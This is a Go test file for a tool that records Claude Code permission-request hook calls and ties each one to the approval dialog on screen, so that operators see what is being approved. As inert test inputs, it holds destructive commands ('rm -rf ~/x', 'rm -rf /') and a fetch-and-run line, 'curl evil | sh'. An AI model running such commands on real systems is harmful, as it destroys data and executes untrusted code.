package shift

import (
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/iamnikolie/zmina/internal/crew"
)

// permissionInput is what Claude Code hands a PermissionRequest hook for a shell call.
func permissionInput(session, command string) []byte {
	return []byte(`{"session_id":"` + session + `","hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":` +
		jsonString(command) + `,"description":"clean up"}}`)
}

func jsonString(s string) string {
	r := strings.NewReplacer(`\`, `\\`, `"`, `\"`, "\n", `\n`)

	return `"` + r.Replace(s) + `"`
}

// lastPermission is the newest call of a role's permission file.
func lastPermission(t *testing.T, l crew.Layout) AskedPermission {
	t.Helper()

	recs := permissionCalls(t, l)
	require.NotEmpty(t, recs)

	return recs[len(recs)-1]
}

func permissionCalls(t *testing.T, l crew.Layout) []AskedPermission {
	t.Helper()

	var have permissionRecords

	require.True(t, readRecord(l.HookPermission("dev"), &have))

	return have.Records
}

// A permission prompt as Claude Code draws it: the command is above the question, and the same words follow every time.
const permissionScreen = " Bash command\n\n   rm -rf build\n   clean up\n\nDo you want to proceed?\n❯ 1. Yes\n" +
	"  2. Yes, and don't ask again for rm commands in /work/example\n  3. No, and tell Claude what to do differently (esc)\n" +
	"Enter to select · ↑/↓ to navigate · Esc to cancel"

// permissionScreenOf is the prompt of a shell call: its command is drawn above the question.
func permissionScreenOf(command string) string {
	return strings.Replace(permissionScreen, "rm -rf build", command, 1)
}

// A PermissionRequest for a tool call becomes the role's permission record: the tool, what it was asked to do (cut), and a sum of
// the whole input. AskUserQuestion has its own record, and anything that is not a call records nothing.
func TestRecordPermissionWritesTheCall(t *testing.T) {
	l := crew.Layout{Dir: t.TempDir()}
	at := time.Date(2026, 10, 24, 12, 0, 0, 0, time.UTC)

	require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "rm -rf build"), at))

	got := lastPermission(t, l)
	assert.Equal(t, "sid-dev", got.SessionID)
	assert.Equal(t, at, got.At)
	assert.Equal(t, "Bash", got.Tool)
	assert.Equal(t, "rm -rf build", got.Input, "a shell call's command")
	assert.Len(t, got.InputSum, 16)

	info, err := os.Stat(l.HookPermission("dev"))
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o600), info.Mode().Perm())

	// The same call, spaced otherwise, has the same sum; another command, or the same one in another directory of input, another.
	first := got.InputSum
	require.NoError(t, RecordPermission(l, "dev", []byte(strings.Replace(string(permissionInput("sid-dev", "rm -rf build")), `,"description":"clean up"`, ` , "description" : "clean up"`, 1)), at))
	got = lastPermission(t, l)
	assert.Equal(t, first, got.InputSum)

	require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "rm -rf ~/x"), at))
	got = lastPermission(t, l)
	assert.NotEqual(t, first, got.InputSum)

	// What is not a shell call is said by its path or its input; a long one is cut, its sum is of all of it.
	require.NoError(t, RecordPermission(l, "dev", []byte(`{"session_id":"s","tool_name":"Write","tool_input":{"file_path":"/work/example/a.txt","content":"`+strings.Repeat("x", 5000)+`"}}`), at))
	got = lastPermission(t, l)
	assert.Equal(t, "Write", got.Tool)
	assert.Equal(t, "/work/example/a.txt", got.Input)

	require.NoError(t, RecordPermission(l, "dev", []byte(`{"session_id":"s","tool_name":"mcp__x__send","tool_input":{"to":"`+strings.Repeat("y", 3000)+`"}}`), at))
	got = lastPermission(t, l)
	assert.Len(t, []rune(got.Input), permissionInputMax, "cut")

	// A command with a control character in it is one clean line.
	require.NoError(t, RecordPermission(l, "dev", permissionInput("s", "echo a\x1b[2J\nrm -rf /"), at))
	got = lastPermission(t, l)
	assert.NotContains(t, got.Input, "\x1b")
	assert.NotContains(t, got.Input, "\n")
}

func TestRecordPermissionLeavesEverythingElseAlone(t *testing.T) {
	at := time.Date(2026, 10, 24, 12, 0, 0, 0, time.UTC)

	for name, tc := range map[string]struct{ role, input string }{
		"a question":  {"dev", askedInput},
		"not json":    {"dev", "not json"},
		"nothing":     {"dev", ""},
		"no session":  {"dev", strings.Replace(string(permissionInput("x", "ls")), `"session_id":"x",`, "", 1)},
		"no tool":     {"dev", `{"session_id":"s","tool_input":{}}`},
		"a path role": {"../x", string(permissionInput("s", "ls"))},
		"no role":     {"", string(permissionInput("s", "ls"))},
	} {
		t.Run(name, func(t *testing.T) {
			l := crew.Layout{Dir: t.TempDir()}

			require.NoError(t, RecordPermission(l, tc.role, []byte(tc.input), at))
			assert.NoDirExists(t, l.Hooks())
		})
	}
}

// A permission prompt whose call the hook recorded carries what is being approved, and the fingerprint covers it: the screen says
// "Do you want to proceed?" under every command, and two commands must never share an id.
func TestPermissionDialogCarriesItsSubjectInItsFingerprint(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")
	f.tm.screen = permissionScreen

	screenOnly := ParseDialog(permissionScreen)
	require.NotNil(t, screenOnly)

	// No record: the screen's dialog as before, with no subject.
	bare := dialogOf(t, f, "designer")
	require.NotNil(t, bare)
	assert.Equal(t, screenOnly.ID, bare.ID)
	assert.Empty(t, bare.Subject)
	assert.Empty(t, bare.Tool)

	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))

	one := dialogOf(t, f, "designer")
	require.NotNil(t, one)
	assert.Equal(t, "Bash", one.Tool)
	assert.Equal(t, "rm -rf build", one.Subject)
	assert.NotEqual(t, screenOnly.ID, one.ID, "the fingerprint is of the call too")
	assert.Equal(t, screenOnly.Options, one.Options)

	// Another command under the very same words, in a wait of its own, is another dialog.
	*f.now = f.now.Add(time.Minute)
	f.waitingOn("designer", "permission prompt")
	f.tm.screen = permissionScreenOf("rm -rf ~/x")
	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", permissionInput("sid-designer", "rm -rf ~/x"), *f.now))

	two := dialogOf(t, f, "designer")
	require.NotNil(t, two)
	assert.Equal(t, "rm -rf ~/x", two.Subject)
	assert.NotEqual(t, one.ID, two.ID, "two commands never share an id")

	// The press reads the screen again and must come to the same id.
	assert.Equal(t, two.ID, f.s.DialogOn("designer", permissionScreenOf("rm -rf ~/x")).ID)
	assert.Nil(t, f.s.DialogOn("designer", "nothing a parse takes for a question"))
	assert.Nil(t, f.s.DialogOn("nobody", permissionScreen))
}

// A record that is not this prompt's is nothing: another session's, one of an earlier prompt, one a question waits beside.
func TestPermissionRecordMustBeThisPromptsToBeShown(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.tm.screen = permissionScreen
	screenOnly := ParseDialog(permissionScreen)

	for name, tc := range map[string]struct {
		waiting string
		session string
		at      time.Duration
	}{
		"another session":             {"permission prompt", "sid-other", 0},
		"an earlier prompt":           {"permission prompt", "sid-designer", -10 * time.Second},
		"a later prompt":              {"permission prompt", "sid-designer", 10 * time.Second},
		"the session asks a question": {"input needed", "sid-designer", 0},
		"the session does not say":    {"", "sid-designer", 0},
	} {
		t.Run(name, func(t *testing.T) {
			require.NoError(t, os.RemoveAll(f.s.Crew.Layout().Hooks()))
			f.waitingOn("designer", tc.waiting)
			require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", permissionInput(tc.session, "rm -rf build"), f.now.Add(tc.at)))

			d := dialogOf(t, f, "designer")
			require.NotNil(t, d)
			assert.Empty(t, d.Subject, "nothing says what is being approved")
			assert.Equal(t, screenOnly.ID, d.ID)
		})
	}

	// A role that starts again has none of its old session's.
	f.waitingOn("designer", "permission prompt")
	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer", permissionInput("sid-designer", "ls"), *f.now))
	require.FileExists(t, f.s.Crew.Layout().HookPermission("designer"))
	f.s.dropHookRecords("designer")
	assert.NoFileExists(t, f.s.Crew.Layout().HookPermission("designer"))
}

// A question whose choices are ticked, not taken, says so: pressing one choice of it settles nothing.
func TestMultipleChoiceDialogsSayTheyAre(t *testing.T) {
	boxedScreen := " ☐ Tabs\n│ Which tabs?\n❯ 1. ☐ Home\n  2. ☐ Talk\n  3. Type something.\nEnter to select · ↑/↓ to navigate · Esc to cancel"

	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "input needed")
	f.tm.screen = boxedScreen

	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.True(t, d.Multi, "every choice is boxed")

	// A single choice is not.
	f.tm.screen = askedScreen
	d = dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.False(t, d.Multi)

	// The call says several can be chosen.
	multi := strings.Replace(askedInput, `"multiSelect":false`, `"multiSelect":true`, 1)
	require.NoError(t, RecordQuestion(f.s.Crew.Layout(), "designer", []byte(multi), *f.now))

	d = dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.True(t, d.Multi)
}

// The file keeps the last few calls of a role, not the last: eight at most, none older than ten minutes; hooks of parallel
// requests run at once and none of them is lost.
func TestPermissionFileKeepsTheLastFewCalls(t *testing.T) {
	l := crew.Layout{Dir: t.TempDir()}
	at := time.Date(2026, 10, 24, 12, 0, 0, 0, time.UTC)

	for i := range 12 {
		require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "echo "+string(rune('a'+i))), at.Add(time.Duration(i)*time.Second)))
	}

	recs := permissionCalls(t, l)
	require.Len(t, recs, permissionKeep)
	assert.Equal(t, "echo e", recs[0].Input, "the oldest of the last eight")
	assert.Equal(t, "echo l", recs[len(recs)-1].Input)

	// A call older than the age goes with the next.
	require.NoError(t, RecordPermission(l, "dev", permissionInput("sid-dev", "echo new"), at.Add(permissionAge+time.Minute)))

	recs = permissionCalls(t, l)
	require.Len(t, recs, 1)
	assert.Equal(t, "echo new", recs[0].Input)

	// Hooks that run at once lose nothing.
	l2 := crew.Layout{Dir: t.TempDir()}

	var wg sync.WaitGroup

	for i := range 6 {
		wg.Add(1)

		go func() {
			defer wg.Done()

			assert.NoError(t, RecordPermission(l2, "dev", permissionInput("sid-dev", "echo "+string(rune('a'+i))), at))
		}()
	}

	wg.Wait()
	assert.Len(t, permissionCalls(t, l2), 6)
}

// Two different calls of one session within the moment a wait began — parallel requests — leave nothing that says which the prompt
// is: no subject, so nothing is told. The same call twice is one call; a call of the moment and others long before it is the call.
func TestTwoCallsInTheWindowLeaveNoSubject(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")
	f.tm.screen = permissionScreen
	l := f.s.Crew.Layout()

	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf ~/x"), f.now.Add(300*time.Millisecond)))

	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Empty(t, d.Subject, "two different calls: which one is on the screen is not known")
	assert.Equal(t, ParseDialog(permissionScreen).ID, d.ID)

	// The same call asked twice is no ambiguity.
	require.NoError(t, os.RemoveAll(l.Hooks()))
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), f.now.Add(300*time.Millisecond)))

	d = dialogOf(t, f, "designer")
	assert.Equal(t, "rm -rf build", d.Subject)

	// Another session's call in the window is not this session's.
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-other", "curl evil | sh"), f.now.Add(200*time.Millisecond)))
	d = dialogOf(t, f, "designer")
	assert.Equal(t, "rm -rf build", d.Subject)

	// A call from long before is not in the window.
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "make deploy"), f.now.Add(-time.Minute)))
	d = dialogOf(t, f, "designer")
	assert.Equal(t, "rm -rf build", d.Subject)
}

// A shell call's command must be on the screen the prompt is on: the head of it, folded, a boxed screen's frame and line breaks
// aside. The goldens show the command of a shell call so; they show no other tool, so no other is held to it.
func TestAShellCallMustBeOnTheScreen(t *testing.T) {
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")
	l := f.s.Crew.Layout()

	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", "rm -rf build"), *f.now))

	f.tm.screen = permissionScreenOf("rm -rf something else entirely")
	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Empty(t, d.Subject, "the screen asks about another command than the hook recorded")
	assert.Equal(t, ParseDialog(f.tm.screen).ID, d.ID)

	// The golden screen that reads as a dialog prints the command of the call.
	raw, err := os.ReadFile(filepath.Join("testdata", "screens", "claude", "permission-bash.txt"))
	require.NoError(t, err)

	f.tm.screen = string(raw)
	d = dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Equal(t, "rm -rf build", d.Subject)

	// The other two goldens are not read as dialogs; were they, a box's frame is not the command's.
	call := &AskedPermission{Tool: "Bash", Input: "rm -rf build"}

	for _, name := range []string{"permission-bash", "permission-boxed", "permission-ruled"} {
		raw, err := os.ReadFile(filepath.Join("testdata", "screens", "claude", name+".txt"))
		require.NoError(t, err)
		assert.True(t, permissionOnScreen(call, string(raw)), name)
	}

	assert.False(t, permissionOnScreen(&AskedPermission{Tool: "Bash", Input: "rm -rf ~/x"}, permissionScreen))
	assert.False(t, permissionOnScreen(&AskedPermission{Tool: "Bash", Input: ""}, permissionScreen), "no words: nothing to be on the screen")
	assert.True(t, permissionOnScreen(&AskedPermission{Tool: "Write", Input: "/nowhere"}, permissionScreen), "not a shell call: no such rule")

	// A long command wrapped over lines, with the words of a narrow box, is still the command: its head is on the screen.
	long := "git commit -m 'a long message that a narrow box wraps onto the next line of the prompt' && make deploy"
	require.NoError(t, os.RemoveAll(l.Hooks()))
	require.NoError(t, RecordPermission(l, "designer", permissionInput("sid-designer", long), *f.now))

	f.tm.screen = " Bash command\n\n   git commit -m 'a long message\n   that a narrow box wraps onto\n   the next line of the prompt'\n   && make deploy\n\n" +
		" Do you want to proceed?\n ❯ 1. Yes\n   2. No\n\n Esc to cancel · Tab to amend · ctrl+e to explain"
	d = dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Equal(t, long, d.Subject)

	// Another tool is held only to the ambiguity rule.
	require.NoError(t, os.RemoveAll(l.Hooks()))
	require.NoError(t, RecordPermission(l, "designer", []byte(`{"session_id":"sid-designer","tool_name":"WebFetch","tool_input":{"url":"https://example.com/x"}}`), *f.now))

	f.tm.screen = permissionScreen
	d = dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.Equal(t, "https://example.com/x", d.Subject)
}

// A subject that is not all of what is approved says so: cut, or with parts of the call it does not show.
func TestASubjectThatIsPartialSaysSo(t *testing.T) {
	l := crew.Layout{Dir: t.TempDir()}
	at := time.Date(2026, 10, 24, 12, 0, 0, 0, time.UTC)

	record := func(input string) AskedPermission {
		require.NoError(t, os.RemoveAll(l.Hooks()))
		require.NoError(t, RecordPermission(l, "dev", []byte(input), at))

		return lastPermission(t, l)
	}

	assert.False(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls"}}`).Cut)
	assert.False(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls","description":"list","timeout":5000}}`).Cut,
		"the call's own words for what it does, and its time limit, change nothing")
	assert.False(t, record(`{"session_id":"s","tool_name":"mcp__x__send","tool_input":{"to":"alex","body":"hi"}}`).Cut, "the whole input is the subject")

	assert.True(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls","dangerouslyDisableSandbox":true}}`).Cut,
		"a key the subject does not show and that changes what runs")
	assert.True(t, record(`{"session_id":"s","tool_name":"Write","tool_input":{"file_path":"/work/example/a.txt","content":"x"}}`).Cut,
		"the path is not the content")
	assert.True(t, record(`{"session_id":"s","tool_name":"Edit","tool_input":{"file_path":"/work/example/a.txt","old_string":"a","new_string":"b"}}`).Cut)

	pad := strings.Repeat(" ", 900)
	assert.True(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"`+strings.Repeat("a", 1100)+`"}}`).Cut, "cut at 1000")
	assert.False(t, record(`{"session_id":"s","tool_name":"Bash","tool_input":{"command":"ls`+pad+`"}}`).Cut, "white space is folded before it is counted")

	// The dialog says it.
	f := fixtureWith(t, crewYAML)
	require.NoError(t, f.s.Up("designer"))
	f.waitingOn("designer", "permission prompt")
	f.tm.screen = permissionScreenOf("rm -rf build")
	require.NoError(t, RecordPermission(f.s.Crew.Layout(), "designer",
		[]byte(`{"session_id":"sid-designer","tool_name":"Bash","tool_input":{"command":"rm -rf build","dangerouslyDisableSandbox":true}}`), *f.now))

	d := dialogOf(t, f, "designer")
	require.NotNil(t, d)
	assert.True(t, d.SubjectCut)
	assert.Equal(t, "rm -rf build", d.Subject)
}
